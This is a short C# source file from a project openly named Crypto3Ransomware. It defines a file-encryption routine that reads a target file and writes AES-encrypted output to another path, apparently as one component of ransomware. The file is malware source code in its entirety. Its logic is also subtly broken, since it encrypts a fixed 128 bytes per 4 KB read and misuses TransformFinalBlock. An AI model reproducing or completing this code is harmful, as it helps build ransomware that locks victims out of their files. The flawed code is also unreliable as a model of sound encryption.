using System.Collections.Concurrent;
using System.Security.Cryptography;
using System.Text;

namespace Crypto3Ransomware;

public static class FileEncrypter
{
    private const int Offset = 0;
    private const int BlocSize = 128;
    
    public static async Task EncryptAndWriteToPath(string fileToEncryptPath, string pathToWriteEncryptedFile)
    {
        using var sourceStream =
            new FileStream(
                fileToEncryptPath,
                FileMode.Open, FileAccess.Read, FileShare.Read,
                bufferSize: BlocSize, useAsync: true);

        var bytes = new byte[0x1000];
        int numRead;
        // ConcurrentBag<byte[]> bytesEncrypted = [];
        var aesEncryptor = new MyAes().GetEncryptor();
        
        using var outputStream = new FileStream(pathToWriteEncryptedFile, FileMode.Append, FileAccess.Write,
            FileShare.ReadWrite, bufferSize: BlocSize, useAsync: true);

        while ((numRead = await sourceStream.ReadAsync(bytes, Offset, bytes.Length)) != 0)
        {
            var hashedBytes = aesEncryptor.TransformFinalBlock(bytes, 0,BlocSize);
            var cancellationToken = new CancellationToken();
            await outputStream.WriteAsync(hashedBytes, cancellationToken);
        }

        
    }
}